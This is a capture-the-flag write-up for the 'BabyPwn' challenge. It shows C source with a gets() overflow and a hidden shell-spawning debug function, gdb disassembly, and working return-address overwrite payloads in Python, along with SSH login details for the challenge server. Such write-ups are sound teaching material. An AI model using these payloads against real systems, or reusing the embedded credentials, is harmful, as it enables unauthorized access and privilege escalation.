# BabyPwn

## Source code

```c
/*┌──(kali㉿kali)-[~]
└─$ ssh -p 10020 baby@tcp0.infra.ctf.grehack.fr
The authenticity of host '[tcp0.infra.ctf.grehack.fr]:10020 ([51.158.241.124]:10020)' can't be established.
ED25519 key fingerprint is SHA256:9qVGGBTZovzLwbjvgsNMvB3ooKGoH9smu3/v+zYQ7bk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[tcp0.infra.ctf.grehack.fr]:10020' (ED25519) to the list of known hosts.
baby@tcp0.infra.ctf.grehack.fr's password: 
New is not always better ! But sometimes, it is :)
9450ff68fe11:~$ ls
baby    baby.c
9450ff68fe11:~$ cat baby.c*/
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void debug(){
    setreuid(geteuid(), geteuid());
    printf("Debug mode enabled\n");
    system("/bin/ash");
}

void banner(){
    puts(
"                                                                          .=****-\n"           
"                                                                      -**=====% \n"           
"                                                                   -+*+=====+%: \n"           
"                                                              .-+**+======*%%=. \n"           
"                                                         :=++**+=====+**#*+===+*+ \n"           
"                                                  .:-+#%@#***************+***+==#- \n"           
"                                           .:=++#@%#*+++++++++++*##@*-.     .-==: \n"           
"                          :.        .:=++**++*##*++++++++++++++++++++**=. \n"           
"                    .==#=**-*--==++*++==+**##+++++++++++++++++++++++++++**: \n"           
"                  -#=#.:# ++#*+=+*****###%*++++++++####*++++++++++++++++++**. \n"           
"        ..:-==+++*****#*#%@*#**#****+==%#++++++++++++++#*+++++++++****++++++#= \n"           
"   -+****++====++*********+*%=+=:.    **++++++++++++++++++++++++##*++*%++++++#* \n"           
"   =++********++++****%#:-===#       +*+++++++++**#*++++++++++++++++++%+++++++#- \n"           
"   -+++++***+++=-:    -+=%:.#.       %++++++++*#-.:%@++++++++++++++++++++++++++% \n"           
"   :=--:.                 *-.*=     -#+++++++**  :@@@+++++++++#+=+@@#++++++++++%. \n"           
"                           ++..=+==:+*++++++*#  *#@@*+++++++#+  +@@@@++++++++++%: \n"           
"                             -++-:.:#*++++++%: =@@@%+++++++%:  :@@@@%++++++++++%. \n"           
"                                 :-=#*++++++@  +@@@*++++++%:  +#@@@#+++++**++++% \n"           
"                                    -#++++++*+:=@@#++++++*+   @@@@%+++++#+-#++*+ \n"           
"                                     %++++++++**+++++++++#=  .@@@@#++++++*#:+#%. \n"           
"                                     +*++++*%**+++*#*+++++%-  #@@@*++++++++#=:% \n"           
"                                   :*#+++++%+++++*%*##+++*+*#*###+++++++++++#*.#. \n"           
"                                  +#+++++++%+++++%*@@++%#*++++++++++++++++++%=*.# \n"           
"                                 -#+++++++++##+++%***+%++++++++++++++++++++%: +=:# \n"           
"                                 +*+++++++++++++++####%+++++++++++++++++++#+  .@.#+=+: \n"           
"                                 :%+++++++++++++++++++*##++++++++++++++++++*#=*-#*:-#:++. \n"           
"                                  -#+++++++++++++++++++++++++++++++++++++++++@*=- -:::  *- \n"           
"                                   .+***+++#*++++++++++++++++++++++++++++++++%: :-:= =.. % \n"           
"                                      .:--:.+#++++++++++++##+++++++++++++++++%. .-  -. *#- \n"           
"                                             .=*#**++++*##=#+++++++++++++++++%++ =* .%=*=  \n"           
"                                .:--:.          .%:**-:-%.:#+#*++++++++++++#*. =+*++++     \n"           
"                             =**++==+**:         =+ +=.#.:#   .-+**#****#*+.               \n"           
"                           +@%%#*======#-         -*.=# -#           ..                    \n"             
"                          =*==+*#%*=====%          .%+ +++=-.   -=:                        \n"
"                          ##**+===*%====%         :*-:*++=---==*%+%***+-                   \n" 
"                          *#******++%==#-       :+=.+=    .:=**+**#====+*                  \n"
"                          -#==+*****#*+*#.    -*-.++.        +#*#*=====+*                  \n"
"                           %#*+===+*#%==###-++::+=         .=*%*+=====+*                   \n"           
"                           :%*****+==%==+=*#-++:          **====+*#==**                    \n"           
"                            -#+******@==+=+#:            #+=========#=                     \n"           
"                             -%==+**#%==*##-            .%========+#:                      \n"           
"                              .##+=+%===#-               =********+    \n"           
"\n"   
    );
}

void slogan(){
    printf("Fill this : New is not always ...?\n");
    char better[10];
    gets(better);
    printf("%s ? The good one is the following one : \n", better);
    printf("New is not always better ! But sometimes, it is ;)\n");
}

int main(){ 
    banner();
    slogan();
    return 0;
}
```

## Debug, addresses and ASM

We can get addresses with `nm` or `gdb`, get the disassembly code and get the EIP position:

```
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
   0x080492e6 <+0>:     push   ebp
   0x080492e7 <+1>:     mov    ebp,esp
   0x080492e9 <+3>:     and    esp,0xfffffff0
   0x080492ec <+6>:     call   0x8049307 <__x86.get_pc_thunk.ax>
   0x080492f1 <+11>:    add    eax,0x2cdb
   0x080492f6 <+16>:    call   0x804925a <banner>
   0x080492fb <+21>:    call   0x8049285 <slogan>
   0x08049300 <+26>:    mov    eax,0x0
   0x08049305 <+31>:    leave
   0x08049306 <+32>:    ret
End of assembler dump.
(gdb) disass slogan
Dump of assembler code for function slogan:
   0x08049285 <+0>:     push   ebp
   0x08049286 <+1>:     mov    ebp,esp
   0x08049288 <+3>:     push   ebx
   0x08049289 <+4>:     sub    esp,0x14
   0x0804928c <+7>:     call   0x80490e2 <__x86.get_pc_thunk.bx>
   0x08049291 <+12>:    add    ebx,0x2d3b
   0x08049297 <+18>:    sub    esp,0xc
   0x0804929a <+21>:    lea    eax,[ebx-0x11a8]
   0x080492a0 <+27>:    push   eax
   0x080492a1 <+28>:    call   0x8049050 <puts@plt>
   0x080492a6 <+33>:    add    esp,0x10
   0x080492a9 <+36>:    sub    esp,0xc
   0x080492ac <+39>:    lea    eax,[ebp-0x12]
   0x080492af <+42>:    push   eax
   0x080492b0 <+43>:    call   0x8049040 <gets@plt>
   0x080492b5 <+48>:    add    esp,0x10
   0x080492b8 <+51>:    sub    esp,0x8
   0x080492bb <+54>:    lea    eax,[ebp-0x12]
   0x080492be <+57>:    push   eax
   0x080492bf <+58>:    lea    eax,[ebx-0x1184]
   0x080492c5 <+64>:    push   eax
   0x080492c6 <+65>:    call   0x8049020 <printf@plt>
   0x080492cb <+70>:    add    esp,0x10
   0x080492ce <+73>:    sub    esp,0xc
   0x080492d1 <+76>:    lea    eax,[ebx-0x1158]
   0x080492d7 <+82>:    push   eax
   0x080492d8 <+83>:    call   0x8049050 <puts@plt>
   0x080492dd <+88>:    add    esp,0x10
   0x080492e0 <+91>:    nop
   0x080492e1 <+92>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080492e4 <+95>:    leave
   0x080492e5 <+96>:    ret
End of assembler dump.
(gdb) disass debug
Dump of assembler code for function debug:
   0x08049205 <+0>:     push   ebp
   0x08049206 <+1>:     mov    ebp,esp
   0x08049208 <+3>:     push   esi
   0x08049209 <+4>:     push   ebx
   0x0804920a <+5>:     call   0x80490e2 <__x86.get_pc_thunk.bx>
   0x0804920f <+10>:    add    ebx,0x2dbd
   0x08049215 <+16>:    call   0x8049030 <geteuid@plt>
   0x0804921a <+21>:    mov    esi,eax
   0x0804921c <+23>:    call   0x8049030 <geteuid@plt>
   0x08049221 <+28>:    sub    esp,0x8
   0x08049224 <+31>:    push   esi
   0x08049225 <+32>:    push   eax
   0x08049226 <+33>:    call   0x8049070 <setreuid@plt>
   0x0804922b <+38>:    add    esp,0x10
   0x0804922e <+41>:    sub    esp,0xc
   0x08049231 <+44>:    lea    eax,[ebx-0x1fcc]
   0x08049237 <+50>:    push   eax
   0x08049238 <+51>:    call   0x8049050 <puts@plt>
   0x0804923d <+56>:    add    esp,0x10
   0x08049240 <+59>:    sub    esp,0xc
   0x08049243 <+62>:    lea    eax,[ebx-0x1fb9]
   0x08049249 <+68>:    push   eax
   0x0804924a <+69>:    call   0x8049060 <system@plt>
   0x0804924f <+74>:    add    esp,0x10
   0x08049252 <+77>:    nop
   0x08049253 <+78>:    lea    esp,[ebp-0x8]
   0x08049256 <+81>:    pop    ebx
   0x08049257 <+82>:    pop    esi
   0x08049258 <+83>:    pop    ebp
   0x08049259 <+84>:    ret
End of assembler dump.
(gdb) 
```

Important lines are:

```asm
push   ebp
mov    ebp,esp
...
lea    eax,[ebp-0x12]
...
call   0x8049040 <gets@plt>
```

The address of the string is `ebp-0x12`, so 18 bytes on the stack are reserved for the string and 4 bytes for the `push ebp`, so padding is 22 bytes to access to the last EIP stored value on the stack.

My payload:

```bash
python3 -c "from sys import stdout;stdout.buffer.write(b'a' * 22 + (0x08049205).to_bytes(4, 'little'))"

./baby < <(python3 -c "from sys import stdout;stdout.buffer.write(b'a' * 22 + (0x08049205).to_bytes(4, 'little'))")
python3 -c "from sys import stdout;stdout.buffer.write(b'a' * 22 + (0x08049205).to_bytes(4, 'little'))" | ./baby
```

In gdb you can use it like this:

```
r < <(python3 -c "from sys import stdout;stdout.buffer.write(b'a' * 22 + (0x08049205).to_bytes(4, 'little'))")
```

In python (on the remote machine over the ssh connection):

```python
from subprocess import Popen, PIPE
p = Popen(["./baby"], stdout=PIPE, stderr=PIPE, stdin=PIPE)
p.stdin.write(b"a" * 22 + (0x08049205).to_bytes(4, 'little') + b"\n")
# p.stdin.close()
# print((p.stdout.read() + p.stderr.read()).decode('latin-1'))
# stdout, stderr = p.communicate(b"a" * a + (0x08049205).to_bytes(4, 'little') + b"\n")
stdout, stderr = p.communicate()
print((stdout + stderr).decode('latin-1'))
```

Unfortunatly the following payload is not working because `pwntools` use file and the file filsystem is read-only, yes `/tmp` is read-only...

```python
from pwn import *
c = ssh(host=" tcp0.infra.ctf.grehack.fr", port=10020, user="baby", password="luV8GgeNzLmi8uERa7")
gdb.attach(c)
c.sendline(b"a" * 22 + (0x08049205).to_bytes(4, 'little'))
c.interactive()
```